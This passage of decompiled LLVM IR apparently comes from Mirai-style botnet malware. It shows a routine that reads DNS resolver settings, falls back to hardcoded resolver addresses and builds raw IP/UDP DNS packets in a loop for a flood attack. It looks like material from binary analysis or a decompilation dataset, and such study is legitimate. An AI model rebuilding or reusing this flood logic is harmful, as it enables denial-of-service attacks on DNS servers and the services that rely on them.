  %v6_d7c8 = call i32 @attack_get_opt_int(i32 %v0_d7c4, i32* %v5_d7c8, i32 %v0_d7bc, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_d7d0 = load i32, i32* @sl, align 4
  store i32 %v0_d7d0, i32* %r3.global-to-local, align 4
  %v0_d7d4 = load i32, i32* @r4, align 4
  store i32 %v0_d7d4, i32* %r1.global-to-local, align 4
  %v0_d7dc = load i32, i32* @r5, align 4
  store i32 %v0_d7dc, i32* %r0.global-to-local, align 4
  %v5_d7e0 = inttoptr i32 %v0_d7d4 to i32*
  %v6_d7e0 = call i32 @attack_get_opt_str(i32 %v0_d7dc, i32* %v5_d7e0, i32 8, i32 %v0_d7d0, i32 %v6_d7c8)
  store i32 %v6_d7e0, i32* @r7, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_d7ec = call i32 @table_unlock_val(i32 33)
  %v0_d7f0 = load i32, i32* @sl, align 4
  store i32 %v0_d7f0, i32* %r1.global-to-local, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_d7f8 = inttoptr i32 %v0_d7f0 to i32*
  %v3_d7f8 = call i32 @table_retrieve_val(i32 33, i32* %v2_d7f8)
  store i32 %v3_d7f8, i32* %r0.global-to-local, align 4
  %v0_d7fc = load i32, i32* @sl, align 4
  store i32 %v0_d7fc, i32* %r1.global-to-local, align 4
  %v2_d800 = inttoptr i32 %v0_d7fc to i16*
  %v3_d800 = call i32 @__libc_open(i32 %v3_d7f8, i16* %v2_d800)
  store i32 %v3_d800, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_d80c = call i32 @table_lock_val(i32 33)
  store i32 %v1_d80c, i32* %r0.global-to-local, align 4
  %v0_d810 = load i32, i32* @r4, align 4
  %v1_d810 = load i32, i32* @sl, align 4
  %v9_d810 = icmp eq i32 %v0_d810, %v1_d810
  store i1 %v9_d810, i1* %cpsr_z.global-to-local, align 1
  %v5_d814 = icmp slt i32 %v0_d810, %v1_d810
  br i1 %v5_d814, label %dec_label_pc_d8d0, label %dec_label_pc_d818

dec_label_pc_d818:                                ; preds = %entry
  %v2_d81c = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_d81c, i32* %sb.global-to-local, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_d81c, i32* @r1, align 4
  store i32 %v0_d810, i32* %r0.global-to-local, align 4
  %v1_d82c = call i32 @__libc_read(i32 %v0_d810)
  store i32 %v1_d82c, i32* @r6, align 4
  %v0_d834 = load i32, i32* @r4, align 4
  store i32 %v0_d834, i32* %r0.global-to-local, align 4
  %v1_d838 = call i32 @__GI___libc_close(i32 %v0_d834)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_d840 = call i32 @table_unlock_val(i32 34)
  %v0_d844 = load i32, i32* @sl, align 4
  store i32 %v0_d844, i32* %r1.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_d84c = inttoptr i32 %v0_d844 to i32*
  %v3_d84c = call i32 @table_retrieve_val(i32 34, i32* %v2_d84c)
  %v0_d850 = load i32, i32* @r6, align 4
  store i32 %v0_d850, i32* @r1, align 4
  store i32 %v3_d84c, i32* %r2.global-to-local, align 4
  store i32 %v2_d81c, i32* %r0.global-to-local, align 4
  %v3_d85c = bitcast i32* %stack_var_-2124 to i8*
  %v4_d85c = call i32 @util_stristr(i8* %v3_d85c, i32 %v0_d850, i32 %v3_d84c)
  store i32 %v4_d85c, i32* @r8, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_d868 = call i32 @table_lock_val(i32 34)
  store i32 %v1_d868, i32* %r0.global-to-local, align 4
  %v0_d86c = load i32, i32* @r8, align 4
  %v7_d86c = icmp eq i32 %v0_d86c, -1
  store i1 %v7_d86c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d86c, label %dec_label_pc_d8d0, label %dec_label_pc_d874

dec_label_pc_d874:                                ; preds = %dec_label_pc_d818
  %v0_d874 = load i32, i32* @r6, align 4
  %v9_d874 = icmp eq i32 %v0_d874, %v0_d86c
  store i1 %v9_d874, i1* %cpsr_z.global-to-local, align 1
  %v7_d878 = icmp sgt i32 %v0_d874, %v0_d86c
  br i1 %v7_d878, label %dec_label_pc_d87c, label %dec_label_pc_d8d0

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d874
  %v0_d87c = load i32, i32* @sl, align 4
  store i32 %v0_d87c, i32* %r1.global-to-local, align 4
  %v0_d880 = load i32, i32* %sb.global-to-local, align 4
  %v2_d880 = add i32 %v0_d880, %v0_d86c
  store i32 %v2_d880, i32* %ip.global-to-local, align 4
  %v1_d890 = add i32 %v0_d874, -1
  br label %dec_label_pc_d888

dec_label_pc_d888:                                ; preds = %dec_label_pc_d8c4, %dec_label_pc_d87c
  %v0_d8c4 = phi i32 [ %v1_d8c4, %dec_label_pc_d8c4 ], [ %v0_d86c, %dec_label_pc_d87c ]
  %v0_d8ac = phi i32 [ %v0_d8ac27, %dec_label_pc_d8c4 ], [ %v0_d87c, %dec_label_pc_d87c ]
  %v0_d88c = phi i32 [ %v0_d88c23, %dec_label_pc_d8c4 ], [ %v0_d87c, %dec_label_pc_d87c ]
  %v0_d894 = phi i32 [ %v1_d894, %dec_label_pc_d8c4 ], [ %v2_d880, %dec_label_pc_d87c ]
  %v1_d888 = inttoptr i32 %v0_d894 to i8*
  %v2_d888 = load i8, i8* %v1_d888, align 1
  %v3_d888 = zext i8 %v2_d888 to i32
  store i32 %v3_d888, i32* %r0.global-to-local, align 4
  %v2_d88c = icmp eq i32 %v0_d88c, 0
  store i1 %v2_d88c, i1* %cpsr_z.global-to-local, align 1
  %v1_d894 = add i32 %v0_d894, 1
  store i32 %v1_d894, i32* %ip.global-to-local, align 4
  %v1_d898 = add nsw i32 %v3_d888, -48
  store i32 %v1_d898, i32* @lr, align 4
  br i1 %v2_d88c, label %dec_label_pc_d8a0, label %dec_label_pc_d8b0

dec_label_pc_d8a0:                                ; preds = %dec_label_pc_d888
  %v7_d8a0 = icmp eq i8 %v2_d888, 9
  store i1 %v7_d8a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d8a0, label %dec_label_pc_d8c4, label %bb

bb:                                               ; preds = %dec_label_pc_d8a0
  %v8_d8a4 = icmp eq i8 %v2_d888, 32
  store i1 %v8_d8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d8a4, label %dec_label_pc_d8c4, label %dec_label_pc_d8ac

dec_label_pc_d8ac:                                ; preds = %bb
  %v1_d8ac = add i32 %v0_d8ac, 1
  store i32 %v1_d8ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d8b0

dec_label_pc_d8b0:                                ; preds = %dec_label_pc_d888, %dec_label_pc_d8ac
  %v0_d8ac28 = phi i32 [ %v0_d8ac, %dec_label_pc_d888 ], [ %v1_d8ac, %dec_label_pc_d8ac ]
  %v0_d88c24 = phi i32 [ %v0_d88c, %dec_label_pc_d888 ], [ %v1_d8ac, %dec_label_pc_d8ac ]
  %v7_d8b0 = icmp eq i8 %v2_d888, 46
  store i1 %v7_d8b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d8b0, label %dec_label_pc_d8bc, label %bb113

bb113:                                            ; preds = %dec_label_pc_d8b0
  %v3_d8b4 = icmp ugt i32 %v1_d898, 8
  %v8_d8b4 = icmp eq i32 %v1_d898, 9
  store i1 %v8_d8b4, i1* %cpsr_z.global-to-local, align 1
  %v2_d8b8 = xor i1 %v8_d8b4, true
  %v3_d8b8 = and i1 %v3_d8b4, %v2_d8b8
  br i1 %v3_d8b8, label %dec_label_pc_dd24, label %dec_label_pc_d8bc

dec_label_pc_d8bc:                                ; preds = %dec_label_pc_d8b0, %bb113
  %v9_d8bc = icmp eq i32 %v1_d890, %v0_d8c4
  store i1 %v9_d8bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d8bc, label %dec_label_pc_dd24, label %dec_label_pc_d8c4

dec_label_pc_d8c4:                                ; preds = %dec_label_pc_d8a0, %dec_label_pc_d8bc, %bb
  %v0_d8ac27 = phi i32 [ %v0_d8ac, %dec_label_pc_d8a0 ], [ %v0_d8ac28, %dec_label_pc_d8bc ], [ %v0_d8ac, %bb ]
  %v0_d88c23 = phi i32 [ 0, %dec_label_pc_d8a0 ], [ %v0_d88c24, %dec_label_pc_d8bc ], [ 0, %bb ]
  %v1_d8c4 = add i32 %v0_d8c4, 1
  store i32 %v1_d8c4, i32* @r4, align 4
  %v9_d8c8 = icmp eq i32 %v1_d8c4, %v0_d874
  store i1 %v9_d8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d8c8, label %dec_label_pc_d8d0, label %dec_label_pc_d888

dec_label_pc_d8d0:                                ; preds = %dec_label_pc_d8c4, %dec_label_pc_d874, %dec_label_pc_d818, %entry
  %v0_d8d0 = call i32 @rand_next()
  %v1_d8d4 = urem i32 %v0_d8d0, 4
  store i32 %v1_d8d4, i32* %r0.global-to-local, align 4
  %v2_d8d8 = icmp eq i32 %v1_d8d4, 3
  store i1 %v2_d8d8, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_d8d0 to i2
  switch i2 %trunc, label %dec_label_pc_d90410 [
    i2 0, label %dec_label_pc_dd70
    i2 1, label %dec_label_pc_dd84
    i2 -2, label %dec_label_pc_dd60
    i2 -1, label %dec_label_pc_d8f4
  ]

dec_label_pc_d8f4:                                ; preds = %dec_label_pc_d8d0
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_d90410:                              ; preds = %dec_label_pc_d8d0
  unreachable

dec_label_pc_d904:                                ; preds = %dec_label_pc_dd84, %dec_label_pc_dd70, %dec_label_pc_dd60, %dec_label_pc_dd24, %dec_label_pc_d8f4
  %stack_var_-2184.0 = phi i32 [ 33686020, %dec_label_pc_d8f4 ], [ 104859200, %dec_label_pc_dd60 ], [ 707416650, %dec_label_pc_dd84 ], [ 134744072, %dec_label_pc_dd70 ], [ %v1_dd54, %dec_label_pc_dd24 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_d908 = call i32 @__GI_time(i32* null)
  %v0_d90c = load i32, i32* @r7, align 4
  %v2_d90c = icmp eq i32 %v0_d90c, 0
  store i1 %v2_d90c, i1* %cpsr_z.global-to-local, align 1
  %v1_d910 = load i32, i32* @fp, align 4
  %v2_d910 = add i32 %v1_d910, %v2_d908
  store i32 %v2_d910, i32* %r0.global-to-local, align 4
  br i1 %v2_d90c, label %dec_label_pc_dcfc, label %dec_label_pc_d91c

dec_label_pc_d91c:                                ; preds = %dec_label_pc_d904
  store i32 %v0_d90c, i32* %r0.global-to-local, align 4
  %v1_d920 = inttoptr i32 %v0_d90c to i8*
  %v2_d920 = call i32 @util_strlen(i8* %v1_d920)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d934 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_d934, i32* %r0.global-to-local, align 4
  %v7_d938 = icmp eq i32 %v3_d934, -1
  store i1 %v7_d938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d938, label %dec_label_pc_dcfc, label %dec_label_pc_d944

dec_label_pc_d944:                                ; preds = %dec_label_pc_d91c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d94c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d94c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d960 = call i32 @__GI_setsockopt(i32 %v3_d934, i32 0, i32 3, i32 %v6_d94c, i32 4)
  store i32 %v5_d960, i32* %r0.global-to-local, align 4
  %v7_d964 = icmp eq i32 %v5_d960, -1
  store i1 %v7_d964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d964, label %dec_label_pc_dcf4, label %dec_label_pc_d96c

dec_label_pc_d96c:                                ; preds = %dec_label_pc_d944
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v3_d988 = mul i32 %v6_d794, 65536
  store i32 %v3_d988, i32* %sb.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_d998 = urem i32 %v7_d720, 65536
  %v3_d99c = urem i32 %v6_d77c, 65536
  store i32 %v3_d99c, i32* %r0.global-to-local, align 4
  %v3_d9a0 = urem i32 %v6_d794, 65536
  store i32 %v3_d9a0, i32* %r1.global-to-local, align 4
  %v3_d9a4 = urem i32 %v6_d7b0, 65536
  store i32 %v3_d9a4, i32* %r2.global-to-local, align 4
  %v2_d9a8 = icmp eq i32 %arg2, 0
  store i1 %v2_d9a8, i1* %cpsr_z.global-to-local, align 1
  %v1_d9ac = urem i32 %v6_d7c8, 256
  store i32 %v1_d9ac, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d9a8, label %dec_label_pc_dd0c.critedge, label %dec_label_pc_d9c8

dec_label_pc_d9c8:                                ; preds = %dec_label_pc_d96c
  %v3_d97c = mul i32 %v6_d7b0, 65536
  %v2_d9d4 = add i32 %v2_d920, %v1_d9ac
  %v3_d9d8 = mul i32 %v2_d9d4, 65536
  %v1_d9e4 = add i32 %v3_d9d8, 1769472
  %tmp114 = mul nuw nsw i32 %v3_d9a0, 256
  %v3_d9e8 = and i32 %tmp114, 65280
  %v1_d9ec = add i32 %v3_d9d8, 3080192
  %tmp115 = udiv i32 %v6_d794, 256
  %v4_d9fc = urem i32 %tmp115, 256
  %v5_d9fc = or i32 %v3_d9e8, %v4_d9fc
  store i32 %v5_d9fc, i32* @sb, align 4
  store i32 %v3_d97c, i32* %ip.global-to-local, align 4
  %tmp116 = udiv i32 %v1_d9e4, 256
  %v3_da04 = and i32 %tmp116, 65280
  %tmp117 = udiv i32 %v1_d9ec, 256
  %v3_da08 = and i32 %tmp117, 65280
  store i32 %v3_da08, i32* %r2.global-to-local, align 4
  %tmp118 = mul i32 %v6_d7b0, 256
  %v3_da0c = and i32 %tmp118, 65280
  %v4_da10 = udiv i32 %v1_d9e4, 16777216
  %v5_da10 = or i32 %v3_da04, %v4_da10
  store i32 %v5_da10, i32* @fp, align 4
  %tmp119 = mul i32 %v7_d720, 256
  %v3_da18 = and i32 %tmp119, 65280
  store i32 %v3_da18, i32* %r1.global-to-local, align 4
  %v4_da1c = udiv i32 %v1_d9ec, 16777216
  %v5_da1c = or i32 %v3_da08, %v4_da1c
  store i32 %v5_da1c, i32* %r3.global-to-local, align 4
  %tmp120 = udiv i32 %v6_d7b0, 256
  %v4_da20 = urem i32 %tmp120, 256
  %v5_da20 = or i32 %v4_da20, %v3_da0c
  store i32 %v5_da20, i32* @r4, align 4
  store i32 %v2_d920, i32* @lr, align 4
  %tmp121 = udiv i32 %v7_d720, 256
  %v4_da28 = urem i32 %tmp121, 256
  %v5_da28 = or i32 %v4_da28, %v3_da18
  %tmp122 = mul i32 %v6_d77c, 256
  %v3_da2c = and i32 %tmp122, 65280
  store i32 %v3_da2c, i32* %r0.global-to-local, align 4
  %tmp123 = udiv i32 %v6_d77c, 256
  %v4_da3c = urem i32 %tmp123, 256
  %v5_da3c = or i32 %v4_da3c, %v3_da2c
  store i32 %v5_da3c, i32* @r8, align 4
  store i32 0, i32* @r5, align 4
  %v1_da44 = add i32 %v2_d920, 1
  store i32 %v1_da44, i32* @r6, align 4
  %v1_da8c = trunc i32 %v6_d6fc to i8
  %sext = mul i32 %v6_d738, 16777216
  %v4_da90 = sdiv i32 %sext, 16777216
  %sext6 = mul nuw i32 %v5_da1c, 65536
  %v4_da98 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_da28, 65536
  %v4_da9c = sdiv i32 %sext7, 65536
  %sext8 = mul nuw i32 %v5_da20, 65536
  %v4_daf8 = sdiv i32 %sext8, 65536
  %v2_db1c = icmp eq i32 %v2_d920, 0
  %tmp124 = icmp slt i32 %v2_d920, 1
  %v1_daa4 = trunc i32 %v4_da90 to i8
  br label %dec_label_pc_da48

dec_label_pc_da48:                                ; preds = %dec_label_pc_db68, %dec_label_pc_d9c8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_da50 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_da50, i32* %r0.global-to-local, align 4
  store i32 %v2_d6e4, i32* %r1.global-to-local, align 4
  %v3_da58 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_da58, i32* %r3.global-to-local, align 4
  %v2_da5c = load i32, i32* @r5, align 4
  %v5_da5c = mul i32 %v2_da5c, 4
  %v6_da5c = add i32 %v5_da5c, %v2_d6e4
  %v7_da5c = inttoptr i32 %v6_da5c to i32*
  store i32 %v2_da50, i32* %v7_da5c, align 4
  %v0_da60 = load i32, i32* %r1.global-to-local, align 4
  %v1_da60 = load i32, i32* %r3.global-to-local, align 4
  %v4_da60 = mul i32 %v1_da60, 4
  %v5_da60 = add i32 %v4_da60, %v0_da60
  %v6_da60 = inttoptr i32 %v5_da60 to i32*
  %v7_da60 = load i32, i32* %v6_da60, align 4
  store i32 %v7_da60, i32* %r1.global-to-local, align 4
  %v1_da64 = inttoptr i32 %v7_da60 to i8*
  %v2_da64 = load i8, i8* %v1_da64, align 1
  %tmp = urem i8 %v2_da64, 16
  %v1_da68 = zext i8 %tmp to i32
  %v1_da6c = or i32 %v1_da68, 64
  store i32 %v1_da6c, i32* %r2.global-to-local, align 4
  %v1_da70 = trunc i32 %v1_da6c to i8
  store i8 %v1_da70, i8* %v1_da64, align 1
  %v0_da74 = load i32, i32* %r1.global-to-local, align 4
  %v1_da74 = inttoptr i32 %v0_da74 to i8*
  %v2_da74 = load i8, i8* %v1_da74, align 1
  %v1_da78 = and i8 %v2_da74, -16
  %v1_da7c = or i8 %v1_da78, 5
  store i32 %v1_d764, i32* %ip.global-to-local, align 4
  store i8 %v1_da7c, i8* %v1_da74, align 1
  store i32 %v1_d708, i32* %lr.global-to-local, align 4
  %v2_da8c = load i32, i32* %r1.global-to-local, align 4
  %v3_da8c = add i32 %v2_da8c, 1
  %v4_da8c = inttoptr i32 %v3_da8c to i8*
  store i8 %v1_da8c, i8* %v4_da8c, align 1
  store i32 %v4_da90, i32* %r3.global-to-local, align 4
  %v0_da94 = load i32, i32* %ip.global-to-local, align 4
  %v2_da94 = icmp eq i32 %v0_da94, 0
  store i1 %v2_da94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_da98, i32* %r0.global-to-local, align 4
  store i32 %v4_da9c, i32* %r2.global-to-local, align 4
  br i1 %v2_da94, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_da48
  store i32 64, i32* %lr.global-to-local, align 4
  br label %bb126

bb126:                                            ; preds = %dec_label_pc_da48, %bb125
  %v2_daa4 = load i32, i32* %r1.global-to-local, align 4
  %v3_daa4 = add i32 %v2_daa4, 8
  %v4_daa4 = inttoptr i32 %v3_daa4 to i8*
  store i8 %v1_daa4, i8* %v4_daa4, align 1
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_daac = load i32, i32* %r1.global-to-local, align 4
  %v3_daac = add i32 %v2_daac, 9
  %v4_daac = inttoptr i32 %v3_daac to i8*
  store i8 17, i8* %v4_daac, align 1
  %v0_dab0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dab0, label %bb128, label %bb127

bb127:                                            ; preds = %bb126
  %v1_dab0 = load i32, i32* %lr.global-to-local, align 4
  %v2_dab0 = trunc i32 %v1_dab0 to i16
  %v3_dab0 = load i32, i32* %r1.global-to-local, align 4
  %v4_dab0 = add i32 %v3_dab0, 6
  %v5_dab0 = inttoptr i32 %v4_dab0 to i16*
  store i16 %v2_dab0, i16* %v5_dab0, align 2
  br label %bb128

bb128:                                            ; preds = %bb126, %bb127
  store i32 ptrtoint (i32* @global_var_27164.91 to i32), i32* @lr, align 4
  %v0_dab8 = load i32, i32* %r0.global-to-local, align 4
  %v1_dab8 = trunc i32 %v0_dab8 to i16
  %v2_dab8 = load i32, i32* %r1.global-to-local, align 4
  %v3_dab8 = add i32 %v2_dab8, 2
  %v4_dab8 = inttoptr i32 %v3_dab8 to i16*
  store i16 %v1_dab8, i16* %v4_dab8, align 2
  %v0_dabc = load i32, i32* %r2.global-to-local, align 4
  %v1_dabc = trunc i32 %v0_dabc to i16
  %v2_dabc = load i32, i32* %r1.global-to-local, align 4
  %v3_dabc = add i32 %v2_dabc, 4
  %v4_dabc = inttoptr i32 %v3_dabc to i16*
  store i16 %v1_dabc, i16* %v4_dabc, align 2
  %v2_dac0 = load i32, i32* @global_var_27164.91, align 4
  store i32 %v2_dac0, i32* %r3.global-to-local, align 4
  %v0_dac4 = load i32, i32* %r1.global-to-local, align 4
  %v1_dac4 = add i32 %v0_dac4, 20
  store i32 %v1_dac4, i32* %r0.global-to-local, align 4
  %v1_dac8 = add i32 %v0_dac4, 41
  store i32 %v1_dac8, i32* %r2.global-to-local, align 4
  %v0_dacc = load i32, i32* @fp, align 4
  %v1_dacc = trunc i32 %v0_dacc to i16
  %v3_dacc = add i32 %v0_dac4, 24
  %v4_dacc = inttoptr i32 %v3_dacc to i16*
  store i16 %v1_dacc, i16* %v4_dacc, align 2
  %v0_dad0 = load i32, i32* @sb, align 4
  %v1_dad0 = trunc i32 %v0_dad0 to i16
  %v2_dad0 = load i32, i32* %r0.global-to-local, align 4
  %v3_dad0 = add i32 %v2_dad0, 2
  %v4_dad0 = inttoptr i32 %v3_dad0 to i16*
  store i16 %v1_dad0, i16* %v4_dad0, align 2
  %v0_dad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_dad4 = add i32 %v0_dad4, 28
  store i32 %v1_dad4, i32* %ip.global-to-local, align 4
  %v0_dad8 = load i32, i32* %r2.global-to-local, align 4
  %v1_dad8 = load i32, i32* @sl, align 4
  %v2_dad8 = add i32 %v1_dad8, %v0_dad8
  store i32 %v2_dad8, i32* @r4, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_dae4 = load i32, i32* @r8, align 4
  %v1_dae4 = trunc i32 %v0_dae4 to i16
  %v3_dae4 = add i32 %v0_dad4, 20
  %v4_dae4 = inttoptr i32 %v3_dae4 to i16*
  store i16 %v1_dae4, i16* %v4_dae4, align 2
  %v0_dae8 = load i32, i32* %r3.global-to-local, align 4
  %v1_dae8 = load i32, i32* %r1.global-to-local, align 4
  %v2_dae8 = add i32 %v1_dae8, 12
  %v3_dae8 = inttoptr i32 %v2_dae8 to i32*
  store i32 %v0_dae8, i32* %v3_dae8, align 4
  %v0_daec = load i32, i32* %r0.global-to-local, align 4
  %v1_daec = trunc i32 %v0_daec to i16
  %v2_daec = load i32, i32* %ip.global-to-local, align 4
  %v3_daec = add i32 %v2_daec, 4
  %v4_daec = inttoptr i32 %v3_daec to i16*
  store i16 %v1_daec, i16* %v4_daec, align 2
  %v0_daf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_daf0 = trunc i32 %v0_daf0 to i16
  %v2_daf0 = load i32, i32* %ip.global-to-local, align 4
  %v3_daf0 = add i32 %v2_daf0, 2
  %v4_daf0 = inttoptr i32 %v3_daf0 to i16*
  store i16 %v1_daf0, i16* %v4_daf0, align 2
  store i32 %stack_var_-2184.0, i32* %r3.global-to-local, align 4
  store i32 %v4_daf8, i32* %ip.global-to-local, align 4
  %v1_dafc = load i32, i32* %r1.global-to-local, align 4
  %v2_dafc = add i32 %v1_dafc, 16
  %v3_dafc = inttoptr i32 %v2_dafc to i32*
  store i32 %stack_var_-2184.0, i32* %v3_dafc, align 4
  %v0_db00 = load i32, i32* %ip.global-to-local, align 4
  %v1_db00 = trunc i32 %v0_db00 to i16
  %v2_db00 = load i32, i32* %r1.global-to-local, align 4
  %v3_db00 = add i32 %v2_db00, 28
  %v4_db00 = inttoptr i32 %v3_db00 to i16*
  store i16 %v1_db00, i16* %v4_db00, align 2
  %v0_db04 = load i32, i32* @sl, align 4
  %v1_db04 = trunc i32 %v0_db04 to i8
  %v2_db04 = load i32, i32* %r1.global-to-local, align 4
  %v3_db04 = add i32 %v2_db04, 40
  %v4_db04 = inttoptr i32 %v3_db04 to i8*
  store i8 %v1_db04, i8* %v4_db04, align 1
  %v0_db08 = load i32, i32* @r4, align 4
  %v1_db08 = add i32 %v0_db08, 1
  store i32 %v1_db08, i32* %r0.global-to-local, align 4
  %v0_db0c = load i32, i32* @r7, align 4
  store i32 %v0_db0c, i32* %r1.global-to-local, align 4
  %v0_db10 = load i32, i32* @r6, align 4
  store i32 %v0_db10, i32* %r2.global-to-local, align 4
  %v3_db14 = call i32 @util_memcpy(i32 %v1_db08, i32 %v0_db0c, i32 %v0_db10)
  store i32 %v3_db14, i32* %r0.global-to-local, align 4
  store i32 %v2_d920, i32* %lr.global-to-local, align 4
  store i1 %v2_db1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp124, label %.dec_label_pc_db68_crit_edge, label %dec_label_pc_db2c

.dec_label_pc_db68_crit_edge:                     ; preds = %bb128
  %v5_db20 = load i32, i32* @r4, align 4
  store i32 %v5_db20, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_db68

dec_label_pc_db2c:                                ; preds = %bb128
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_db30 = load i32, i32* @r4, align 4
  store i32 %v0_db30, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_db38

dec_label_pc_db38:                                ; preds = %.thread21, %dec_label_pc_db2c
  %v1_db40 = phi i32 [ %v1_db4035, %.thread21 ], [ 0, %dec_label_pc_db2c ]
  %v0_db5419 = phi i32 [ %v0_db60, %.thread21 ], [ 0, %dec_label_pc_db2c ]
  %v1_db38 = load i32, i32* @r7, align 4
  %v2_db38 = add i32 %v1_db38, %v0_db5419
  %v3_db38 = inttoptr i32 %v2_db38 to i8*
  %v4_db38 = load i8, i8* %v3_db38, align 1
  %v6_db38 = zext i8 %v4_db38 to i32
  store i32 %v6_db38, i32* %r3.global-to-local, align 4
  %v7_db3c = icmp eq i8 %v4_db38, 46
  store i1 %v7_db3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_db3c, label %bb129, label %bb131

bb129:                                            ; preds = %dec_label_pc_db38
  %v2_db40 = trunc i32 %v1_db40 to i8
  %v3_db40 = load i32, i32* %r0.global-to-local, align 4
  %v4_db40 = inttoptr i32 %v3_db40 to i8*
  store i8 %v2_db40, i8* %v4_db40, align 1
  %v0_db48.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_db44 = load i32, i32* %ip.global-to-local, align 4
  %v1_db44 = add i32 %v0_db44, 1
  store i32 %v1_db44, i32* %r2.global-to-local, align 4
  br i1 %v0_db48.pr, label %bb132, label %bb130

bb130:                                            ; preds = %bb129
  %v2_db4817 = urem i32 %v1_db44, 256
  store i32 %v2_db4817, i32* %ip.global-to-local, align 4
  store i32 %v2_d920, i32* %r2.global-to-local, align 4
  %v0_db54.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_db54 = add i32 %v0_db54.pre, 1
  store i32 %v1_db54, i32* %r1.global-to-local, align 4
  br label %.thread21

bb131:                                            ; preds = %dec_label_pc_db38
  %v1_db4413 = add nsw i32 %v1_db40, 1
  %v2_db48 = urem i32 %v1_db4413, 256
  store i32 %v2_db48, i32* %ip.global-to-local, align 4
  store i32 %v2_d920, i32* %r2.global-to-local, align 4
  %v1_db5420 = add i32 %v0_db5419, 1
  store i32 %v1_db5420, i32* %r1.global-to-local, align 4
  br label %.thread21

bb132:                                            ; preds = %bb129
  store i32 %v2_d920, i32* %r2.global-to-local, align 4
  %v1_db50.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_db50 = load i32, i32* @r4, align 4
  %v3_db50 = add i32 %v2_db50, %v1_db50.pre
  store i32 %v3_db50, i32* %r3.global-to-local, align 4
  %v1_db5465 = add i32 %v1_db50.pre, 1
  store i32 %v1_db5465, i32* %r1.global-to-local, align 4
  %v2_db58 = add i32 %v3_db50, 1
  store i32 %v2_db58, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread21

.thread21:                                        ; preds = %bb131, %bb130, %bb132
  %v0_db60 = phi i32 [ %v1_db54, %bb130 ], [ %v1_db5420, %bb131 ], [ %v1_db5465, %bb132 ]
  %v1_db4035 = phi i32 [ %v2_db4817, %bb130 ], [ %v2_db48, %bb131 ], [ 0, %bb132 ]
  %v9_db60 = icmp eq i32 %v0_db60, %v2_d920
  store i1 %v9_db60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_db60, label %dec_label_pc_db68.loopexit, label %dec_label_pc_db38

dec_label_pc_db68.loopexit:                       ; preds = %.thread21
  %v2_db68.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t71 = trunc i32 %v1_db4035 to i8
  br label %dec_label_pc_db68

dec_label_pc_db68:                                ; preds = %.dec_label_pc_db68_crit_edge, %dec_label_pc_db68.loopexit
  %v0_db68.pre.sink.off0 = phi i8 [ 0, %.dec_label_pc_db68_crit_edge ], [ %extract.t71, %dec_label_pc_db68.loopexit ]
  %v2_db68 = phi i32 [ %v5_db20, %.dec_label_pc_db68_crit_edge ], [ %v2_db68.pre, %dec_label_pc_db68.loopexit ]
  %v3_db68 = inttoptr i32 %v2_db68 to i8*
  store i8 %v0_db68.pre.sink.off0, i8* %v3_db68, align 1
  %v3_db6c = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_db74 = add i32 %v3_db6c, 1
